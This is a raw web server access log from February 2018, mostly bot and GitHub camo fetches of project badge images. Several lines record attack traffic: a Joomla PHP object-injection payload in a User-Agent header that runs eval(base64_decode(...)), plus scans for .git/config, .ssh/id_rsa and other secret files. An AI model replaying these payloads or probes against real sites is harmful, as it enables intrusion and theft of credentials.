40.77.167.127 - - [18/Feb/2018:12:10:43 +0000] "GET /style/common.css HTTP/1.1" 200 23447 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
192.30.252.35 - - [18/Feb/2018:12:45:53 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
131.253.27.135 - - [18/Feb/2018:13:11:41 +0000] "GET /style/bootstrap.min.css HTTP/1.1" 200 122155 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
131.253.27.135 - - [18/Feb/2018:13:11:42 +0000] "GET /style/bootstrap.min.js HTTP/1.1" 200 37107 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b"
192.30.252.46 - - [18/Feb/2018:13:26:57 +0000] "GET /badge/wapmorgan/time-parser HTTP/1.1" 200 1190 "-" "github-camo (65c9ebe0)"
194.8.47.115 - - [18/Feb/2018:13:33:43 +0000] "GET /badge/wapmorgan/time-parser HTTP/1.1" 200 1190 "http://wapmorgan.github.io/TimeParser/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
85.201.165.224 - - [18/Feb/2018:14:00:17 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "http://wapmorgan.github.io/PhpCodeFixer/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
165.169.234.186 - - [18/Feb/2018:14:01:00 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
165.169.234.186 - - [18/Feb/2018:14:24:14 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
165.169.234.186 - - [18/Feb/2018:14:32:57 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
192.30.252.36 - - [18/Feb/2018:15:32:44 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.34 - - [18/Feb/2018:16:42:55 +0000] "GET /badge/wapmorgan/php-rpm-packager HTTP/1.1" 200 1209 "-" "github-camo (65c9ebe0)"
76.114.38.238 - - [18/Feb/2018:16:43:18 +0000] "GET /badge/wapmorgan/php-rpm-packager HTTP/1.1" 200 1209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6"
162.204.123.199 - - [18/Feb/2018:16:48:37 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
192.30.252.38 - - [18/Feb/2018:21:57:57 +0000] "GET /badge/wapmorgan/threadable HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
192.30.252.35 - - [19/Feb/2018:02:48:12 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.35 - - [19/Feb/2018:04:08:04 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "github-camo (65c9ebe0)"
66.249.79.2 - - [19/Feb/2018:04:25:23 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.31 - - [19/Feb/2018:04:25:23 +0000] "GET /mhbanavgdvr.html HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
192.30.252.34 - - [19/Feb/2018:04:28:31 +0000] "GET /badge/wapmorgan/yii2-inflection HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
54.37.85.61 - - [19/Feb/2018:05:44:24 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
54.37.85.61 - - [19/Feb/2018:05:44:48 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
54.37.85.61 - - [19/Feb/2018:05:45:13 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
54.37.85.61 - - [19/Feb/2018:05:45:37 +0000] "GET /badge/wapmorgan/php-rpm-packager HTTP/1.1" 200 1209 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
54.37.85.61 - - [19/Feb/2018:05:46:00 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
54.37.85.61 - - [19/Feb/2018:05:46:23 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
192.30.252.38 - - [19/Feb/2018:06:13:43 +0000] "GET /badge/wapmorgan/yii2-inflection HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
122.180.30.50 - - [19/Feb/2018:09:55:03 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
159.203.81.93 - - [19/Feb/2018:09:55:05 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "207.154.213.106" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
192.30.252.35 - - [19/Feb/2018:11:52:00 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.38 - - [19/Feb/2018:11:52:27 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
192.30.252.38 - - [19/Feb/2018:12:02:56 +0000] "GET /badge/wapmorgan/threadable HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
66.249.79.2 - - [19/Feb/2018:12:48:24 +0000] "GET / HTTP/1.1" 200 3393 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.31 - - [19/Feb/2018:12:48:30 +0000] "GET /style/common.css HTTP/1.1" 200 23447 "http://composer.network/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.31 - - [19/Feb/2018:12:48:30 +0000] "GET /style/1.css HTTP/1.1" 200 30680 "http://composer.network/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.2 - - [19/Feb/2018:12:48:31 +0000] "GET /style/bootstrap.min.css HTTP/1.1" 200 122155 "http://composer.network/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.31 - - [19/Feb/2018:12:48:31 +0000] "GET /style/site.css HTTP/1.1" 200 34938 "http://composer.network/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
192.30.252.38 - - [19/Feb/2018:13:03:49 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.38 - - [19/Feb/2018:14:20:25 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "github-camo (65c9ebe0)"
192.30.252.38 - - [19/Feb/2018:15:42:50 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.35 - - [19/Feb/2018:15:44:24 +0000] "GET /badge/wapmorgan/system-daemon HTTP/1.1" 200 1202 "-" "github-camo (65c9ebe0)"
66.249.79.31 - - [19/Feb/2018:16:11:25 +0000] "GET / HTTP/1.1" 200 3393 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
192.30.252.38 - - [19/Feb/2018:16:22:50 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.46 - - [19/Feb/2018:16:53:57 +0000] "GET /badge/wapmorgan/yii2-inflection HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
54.188.104.81 - - [19/Feb/2018:17:23:53 +0000] "GET / HTTP/1.1" 200 3393 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
192.30.252.47 - - [19/Feb/2018:18:27:16 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "github-camo (65c9ebe0)"
177.129.73.64 - - [19/Feb/2018:19:06:00 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
192.30.252.46 - - [19/Feb/2018:21:36:46 +0000] "GET /badge/wapmorgan/system-daemon HTTP/1.1" 200 1202 "-" "github-camo (65c9ebe0)"
102.168.74.104 - - [19/Feb/2018:21:40:48 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "http://wapmorgan.github.io/UnifiedArchive/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
84.211.233.254 - - [19/Feb/2018:22:05:38 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "http://wapmorgan.github.io/PhpCodeFixer/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 OPR/50.0.2762.67"
192.30.252.38 - - [19/Feb/2018:22:27:30 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
87.18.84.67 - - [19/Feb/2018:22:44:00 +0000] "GET /badge/wapmorgan/php-rpm-packager HTTP/1.1" 200 1209 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
87.18.84.67 - - [19/Feb/2018:22:44:02 +0000] "GET /badge/wapmorgan/php-rpm-packager HTTP/1.1" 200 1209 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
66.249.79.31 - - [19/Feb/2018:22:48:45 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.5 - - [19/Feb/2018:22:48:46 +0000] "GET / HTTP/1.1" 200 3393 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
101.51.82.109 - - [20/Feb/2018:01:29:27 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
195.22.127.224 - - [20/Feb/2018:01:47:14 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
66.249.79.2 - - [20/Feb/2018:02:07:27 +0000] "GET / HTTP/1.1" 200 3393 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
24.26.129.129 - - [20/Feb/2018:02:52:02 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.121 Safari/537.36 Vivaldi/1.95.1077.41"
192.30.252.34 - - [20/Feb/2018:02:52:15 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "github-camo (65c9ebe0)"
66.249.83.81 - - [20/Feb/2018:02:53:12 +0000] "GET /badge/wapmorgan/php-rpm-packager HTTP/1.1" 200 1209 "-" "Mozilla/5.0 (Linux; Android 6.0; HUAWEI VNS-L23 Build/HUAWEIVNS-L23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36"
66.249.79.2 - - [20/Feb/2018:03:06:14 +0000] "GET / HTTP/1.1" 200 3393 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
192.30.252.47 - - [20/Feb/2018:03:23:39 +0000] "GET /badge/wapmorgan/php-code-analyzer HTTP/1.1" 200 1214 "-" "github-camo (65c9ebe0)"
192.187.101.178 - - [20/Feb/2018:04:43:29 +0000] "GET / HTTP/1.1" 200 3393 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0"
192.30.252.38 - - [20/Feb/2018:04:48:07 +0000] "GET /badge/wapmorgan/cab-archive HTTP/1.1" 200 1190 "-" "github-camo (65c9ebe0)"
195.22.125.223 - - [20/Feb/2018:06:06:39 +0000] "GET / HTTP/1.1" 200 9633 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
195.22.125.223 - - [20/Feb/2018:06:06:39 +0000] "GET / HTTP/1.1" 200 9633 "-" "}__test|O:21:\x22JDatabaseDriverMysqli\x22:3:{s:4:\x22\x5C0\x5C0\x5C0a\x22;O:17:\x22JSimplepieFactory\x22:0:{}s:21:\x22\x5C0\x5C0\x5C0disconnectHandlers\x22;a:1:{i:0;a:2:{i:0;O:9:\x22SimplePie\x22:5:{s:8:\x22sanitize\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}s:5:\x22cache\x22;b:1;s:19:\x22cache_name_function\x22;s:6:\x22assert\x22;s:10:\x22javascript\x22;i:9999;s:8:\x22feed_url\x22;s:54:\x22eval(base64_decode($_POST[111]));JFactory::get();exit;\x22;}i:1;s:4:\x22init\x22;}}s:13:\x22\x5C0\x5C0\x5C0connection\x22;i:1;}\xF0\x9D\x8C\x86"
195.22.125.223 - - [20/Feb/2018:06:06:40 +0000] "POST / HTTP/1.1" 405 584 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
195.22.125.223 - - [20/Feb/2018:06:06:40 +0000] "GET /libraries/sfn.php HTTP/1.1" 404 580 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
192.30.252.35 - - [20/Feb/2018:07:04:41 +0000] "GET /badge/wapmorgan/morphos-blade HTTP/1.1" 200 1202 "-" "github-camo (65c9ebe0)"
178.120.179.27 - - [20/Feb/2018:07:24:34 +0000] "GET /badge/wapmorgan/time-parser HTTP/1.1" 200 1190 "http://wapmorgan.github.io/TimeParser/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
192.30.252.34 - - [20/Feb/2018:07:32:58 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
192.30.252.34 - - [20/Feb/2018:11:54:31 +0000] "GET /badge/wapmorgan/file-type-detector HTTP/1.1" 200 1215 "-" "github-camo (65c9ebe0)"
194.187.171.179 - - [20/Feb/2018:14:55:27 +0000] "GET /favicon.ico HTTP/1.1" 200 4286 "-" "Qwantify/1.0"
192.30.252.34 - - [20/Feb/2018:16:17:23 +0000] "GET /badge/wapmorgan/php-code-analyzer HTTP/1.1" 200 1214 "-" "github-camo (65c9ebe0)"
192.30.252.46 - - [20/Feb/2018:16:23:07 +0000] "GET /badge/wapmorgan/php-code-analyzer HTTP/1.1" 200 1214 "-" "github-camo (65c9ebe0)"
86.57.133.212 - - [20/Feb/2018:16:47:38 +0000] "GET /badge/wapmorgan/file-type-detector HTTP/1.1" 200 1215 "http://wapmorgan.github.io/FileTypeDetector/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0"
82.99.223.82 - - [20/Feb/2018:17:23:04 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
192.30.252.38 - - [20/Feb/2018:17:25:45 +0000] "GET /badge/wapmorgan/system-daemon HTTP/1.1" 200 1202 "-" "github-camo (65c9ebe0)"
123.125.67.166 - - [20/Feb/2018:20:55:41 +0000] "GET /robots.txt HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
192.30.252.36 - - [20/Feb/2018:21:55:08 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
107.167.112.105 - - [20/Feb/2018:22:12:48 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "Opera/9.80 (J2ME/MIDP; Opera Mini/8.0.35626/87.4; U; id) Presto/2.12.423 Version/12.16"
192.30.252.35 - - [20/Feb/2018:22:42:05 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.38 - - [20/Feb/2018:23:53:21 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
54.37.85.61 - - [21/Feb/2018:00:45:57 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
54.37.85.61 - - [21/Feb/2018:00:46:03 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
54.37.85.61 - - [21/Feb/2018:00:49:26 +0000] "GET /badge/wapmorgan/php-rpm-packager HTTP/1.1" 200 1209 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
54.37.85.61 - - [21/Feb/2018:00:52:32 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
54.37.85.61 - - [21/Feb/2018:00:53:46 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
192.30.252.34 - - [21/Feb/2018:01:40:13 +0000] "GET /badge/wapmorgan/php-code-analyzer HTTP/1.1" 200 1214 "-" "github-camo (65c9ebe0)"
129.78.110.124 - - [21/Feb/2018:02:07:00 +0000] "GET / HTTP/1.1" 200 3393 "-" "-"
192.30.252.34 - - [21/Feb/2018:02:07:14 +0000] "GET /badge/wapmorgan/threadable HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
38.142.192.66 - - [21/Feb/2018:05:31:35 +0000] "GET / HTTP/1.1" 200 9633 "-" "-"
192.30.252.36 - - [21/Feb/2018:05:44:16 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
81.163.235.63 - - [21/Feb/2018:08:30:13 +0000] "GET /badge/wapmorgan/php-rpm-packager HTTP/1.1" 200 1209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
192.30.252.36 - - [21/Feb/2018:10:01:29 +0000] "GET /badge/wapmorgan/morphos-twig HTTP/1.1" 200 1193 "-" "github-camo (65c9ebe0)"
52.91.146.4 - - [21/Feb/2018:10:05:30 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
52.91.146.4 - - [21/Feb/2018:10:06:00 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
52.91.146.4 - - [21/Feb/2018:10:06:56 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
52.91.146.4 - - [21/Feb/2018:10:07:26 +0000] "GET /badge/wapmorgan/php-rpm-packager HTTP/1.1" 200 1209 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
52.91.146.4 - - [21/Feb/2018:10:07:57 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
52.91.146.4 - - [21/Feb/2018:10:08:27 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
192.30.252.35 - - [21/Feb/2018:10:11:43 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.47 - - [21/Feb/2018:10:19:19 +0000] "GET /badge/wapmorgan/php-code-analyzer HTTP/1.1" 200 1214 "-" "github-camo (65c9ebe0)"
192.30.252.35 - - [21/Feb/2018:10:37:00 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
192.30.252.38 - - [21/Feb/2018:10:44:31 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
192.30.252.36 - - [21/Feb/2018:10:44:35 +0000] "GET /badge/wapmorgan/time-parser HTTP/1.1" 200 1190 "-" "github-camo (65c9ebe0)"
192.30.252.34 - - [21/Feb/2018:10:46:47 +0000] "GET /badge/wapmorgan/imagery HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
82.80.54.55 - - [21/Feb/2018:12:01:58 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.133.248.248 - - [21/Feb/2018:12:08:42 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "http://wapmorgan.github.io/PhpCodeFixer/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
192.30.252.38 - - [21/Feb/2018:12:30:14 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
192.30.252.46 - - [21/Feb/2018:12:42:48 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
66.249.64.68 - - [21/Feb/2018:21:19:32 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.65 - - [21/Feb/2018:21:19:32 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "Googlebot-Image/1.0"
192.30.252.34 - - [21/Feb/2018:21:56:58 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.35 - - [21/Feb/2018:22:24:13 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "github-camo (65c9ebe0)"
192.30.252.34 - - [21/Feb/2018:22:24:16 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "github-camo (65c9ebe0)"
91.99.9.162 - - [21/Feb/2018:22:52:37 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
185.106.122.254 - - [22/Feb/2018:01:27:42 +0000] "GET /assets/global/plugins/jquery-file-upload/server/node/server.js HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
192.30.252.47 - - [22/Feb/2018:02:40:13 +0000] "GET /badge/wapmorgan/file-type-detector HTTP/1.1" 200 1215 "-" "github-camo (65c9ebe0)"
192.30.252.34 - - [22/Feb/2018:03:17:51 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
121.58.197.226 - - [22/Feb/2018:03:18:41 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
66.249.64.65 - - [22/Feb/2018:03:23:13 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Googlebot-Image/1.0"
192.30.252.36 - - [22/Feb/2018:03:50:37 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "github-camo (65c9ebe0)"
14.139.252.30 - - [22/Feb/2018:07:02:03 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "http://wapmorgan.github.io/PhpCodeFixer/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
192.30.252.38 - - [22/Feb/2018:07:41:55 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "github-camo (65c9ebe0)"
192.30.252.35 - - [22/Feb/2018:08:24:37 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
192.30.252.46 - - [22/Feb/2018:09:27:38 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
202.159.218.126 - - [22/Feb/2018:09:45:17 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "http://wapmorgan.github.io/PhpCodeFixer/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
202.159.218.126 - - [22/Feb/2018:09:46:14 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "http://wapmorgan.github.io/PhpCodeFixer/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
192.30.252.46 - - [22/Feb/2018:10:37:45 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "github-camo (65c9ebe0)"
5.188.203.40 - - [22/Feb/2018:10:40:01 +0000] "GET /.git/config HTTP/1.1" 403 178 "-" "fasthttp"
5.188.203.40 - - [22/Feb/2018:10:40:01 +0000] "GET /.svn/wc.db HTTP/1.1" 403 178 "-" "fasthttp"
5.188.203.40 - - [22/Feb/2018:10:40:01 +0000] "GET /.hg/hgrc HTTP/1.1" 403 178 "-" "fasthttp"
5.188.203.40 - - [22/Feb/2018:10:40:01 +0000] "GET /.ssh/id_rsa HTTP/1.1" 403 178 "-" "fasthttp"
5.188.203.40 - - [22/Feb/2018:10:40:01 +0000] "GET /sftp_config.json HTTP/1.1" 404 178 "-" "fasthttp"
5.188.203.40 - - [22/Feb/2018:10:40:01 +0000] "GET /.idea/WebServers.xml HTTP/1.1" 403 178 "-" "fasthttp"
5.188.203.40 - - [22/Feb/2018:10:40:01 +0000] "GET /.DS_Store HTTP/1.1" 403 178 "-" "fasthttp"
192.30.252.47 - - [22/Feb/2018:13:15:23 +0000] "GET /badge/wapmorgan/ncursesobjects HTTP/1.1" 200 1203 "-" "github-camo (65c9ebe0)"
192.30.252.36 - - [22/Feb/2018:13:39:45 +0000] "GET /badge/wapmorgan/yii2-inflection HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
192.30.252.47 - - [22/Feb/2018:13:47:18 +0000] "GET /badge/wapmorgan/onecloud-api HTTP/1.1" 200 1193 "-" "github-camo (65c9ebe0)"
52.91.151.105 - - [22/Feb/2018:15:38:46 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
52.91.151.105 - - [22/Feb/2018:15:39:16 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
52.91.151.105 - - [22/Feb/2018:15:39:48 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
